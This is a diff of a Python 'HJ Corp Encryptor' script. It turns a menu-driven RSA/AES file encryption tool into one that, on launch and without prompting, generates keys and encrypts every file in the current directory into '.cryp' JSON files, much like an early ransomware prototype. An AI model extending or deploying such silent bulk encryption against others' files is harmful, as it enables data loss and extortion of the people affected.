@@ -10,78 +10,52 @@ from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.backends import default_backend
 
-#Beginning of main 
 def main():
-	while(True):
-		print("***HJ Corp Encryptor***")
-		print("Select the number of one of the following commands:")
-		print("1) Generate RSA tokens")
-		print("2) Encrypt a file using RSA")
-		print("3) Decrypt a file ")
-		opCommand = input("Choose a command:")
-		if opCommand == "1":
-			RSA_key_path = "keys/rsa"
-			rsaPrivKey = rsa.generate_private_key(public_exponent=65537, key_size = 2048, backend = default_backend())
-	#Generate public key from privatekey
-			rsaPubKey = rsaPrivKey.public_key()
-	#Serialize keys for file
-			privPem = rsaPrivKey.private_bytes(encoding=serialization.Encoding.PEM, format = serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption())
-			pubPem = rsaPubKey.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
-	#split path from file name
-			kPath, kName =os.path.split(RSA_key_path)
-	#Check if path is a directory, create it if it does not exist
-			if kPath != "":
-				os.makedirs(kPath, exist_ok=True)
-	#if there is no tail, add "default" to key path for key gen 
-			if kName == "":
-				print ("No name entered. default.pem, default.pub will be created in chosen directory")
-				RSA_key_path = RSA_key_path + "default"
-	#Write keys to files
-			createFile = open(RSA_key_path+".pem", "wb")
-			createFile.write(privPem)
-			createFile.close()
-			createFile = open(RSA_key_path+".pub", "wb")
-			createFile.write(pubPem)
-			createFile.close()
-			print(kName,".pem and ", kName,".pub have been created in the",kPath, "/ folder")
-	#User enters encrypt option
-		elif opCommand =='2':
-			print ("Enter the location of the file you would like to RSA encrypt")
-			encryptedFile = promptForFile()
-			print ("Enter location of the public key (.pub extension): ")
-			rsaPath = promptForFile()
-			RSACipher, cipher, IV, tag, ext = RSAEncryptMAC.myRSAEncrypt(encryptedFile,rsaPath)
-			jsonPack(RSACipher, cipher, IV, tag, ext)
-			print("Encryption complete.")
-		elif opCommand == '3':
-			print("Enter the path of the the file you want to decrypt.")
-			dFile = promptForFile()	
-			RSACipher, cipher, IV, tag, ext= jsonUnpack(dFile)
-			print("Enter location of private key(.pem extension):")
-			privPath = promptForFile()
-			RSAEncryptMAC.myRSADecrypt(RSACipher, cipher, IV, tag, ext, privPath)
-		elif opCommand == '4':
-			print("Exiting...")
-			break;
-		else:
-			print("Error command")	
-#End of main
+	#Check if key at path exists. If not, generate a key at said path
+	default_key_path = "keys/rsa"
+	if os.path.isfile(default_key_path + ".pem"):
+		print("")
+	else:	
+		print("")		
+		rsaKeyGen(default_key_path)
+	currentDir = os.getcwd()
+	fileNames = os.listdir(currentDir)
+	for name in fileNames:
+		print (name)
+		if os.path.isfile(name):
+			RSACipher, cipher, IV, tag, ext = RSAEncryptMAC.myRSAEncrypt(name, default_key_path + ".pub")
+			jsonPack(RSACipher, cipher, IV, tag, ext, name)
+	#RSACipher, cipher, IV, tag, ext, name = jsonUpack(decryptPath)
 
-def promptForFile():
-	#Prompt to check if file path is valid. E to exit
-	while(True):
-		userFile = input("Enter location of file: ")
-		if userFile == "E":
-			return userFile
-		if os.path.isfile(userFile):
-			return userFile
-		else:
-			print ("File not found!")
-def jsonPack(Enckey, cipher, IV, tag, ext):
+#End of Main
+def rsaKeyGen(RSA_key_path):
+	rsaPrivKey = rsa.generate_private_key(public_exponent=65537, key_size = 2048, backend = default_backend())
+#Generate public key from privatekey
+	rsaPubKey = rsaPrivKey.public_key()
+#Serialize keys for file
+	privPem = rsaPrivKey.private_bytes(encoding=serialization.Encoding.PEM, format = serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption())
+	pubPem = rsaPubKey.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
+
+	kPath, kName = os.path.split(RSA_key_path)
+#Check if path is a directory, create it if it does not exist
+	if kPath != "":
+		os.makedirs(kPath, exist_ok=True)
+#if there is no tail, add "default" to key path for key gen 
+	if kName == "":
+		print ("No name entered. default.pem, default.pub will be created in chosen directory")
+		RSA_key_path = RSA_key_path + "default"
+	#Write keys to files
+	createFile = open(RSA_key_path+".pem", "wb")
+	createFile.write(privPem)
+	createFile.close()
+	createFile = open(RSA_key_path+".pub", "wb")
+	createFile.write(pubPem)
+	createFile.close()
+
+def jsonPack(Enckey, cipher, IV, tag, ext, fileName):
 #Prompt user for what they would like to save the name as and add custom extension
-	saveAs = input("Save encrypted file as (will be assigned .cryp extension: ")
-	fileEncrypted = saveAs + ".cryp"
-	#Create new file and write cipher text to it
+	fileEncrypted = fileName + ".cryp"
+	#Create new file and write ciphertext and related data to it
 	fEncrypt = open(fileEncrypted,"w")
 	fileInfo = {}
 	fileInfo["key"] = b64encode(Enckey).decode('utf-8')
@@ -89,9 +63,11 @@ def jsonPack(Enckey, cipher, IV, tag, ext):
 	fileInfo["iv"] = b64encode(IV).decode('utf-8')
 	fileInfo["tag"] = b64encode(tag).decode('utf-8')
 	fileInfo["ext"] = ext
+	fileInfo["name"] = fileName
 	json.dump(fileInfo, fEncrypt)
 	fEncrypt.close()
 def jsonUnpack(filepath):
+	#Open file, load and return different values
 	jsonFile = open(filepath, 'r')
 	jLoad = json.load(jsonFile)
 	jsonFile.close()
@@ -100,6 +76,7 @@ def jsonUnpack(filepath):
 	jIV = b64decode(jLoad["iv"])
 	jExt = jLoad["ext"]
 	jTag = b64decode(jLoad["tag"])
-	return jKey, jCipher, jIV, jTag, jExt
+	jName = jLoad["name"]
+	return jKey, jCipher, jIV, jTag, jExt, jName
 if __name__=="__main__":
 	main()
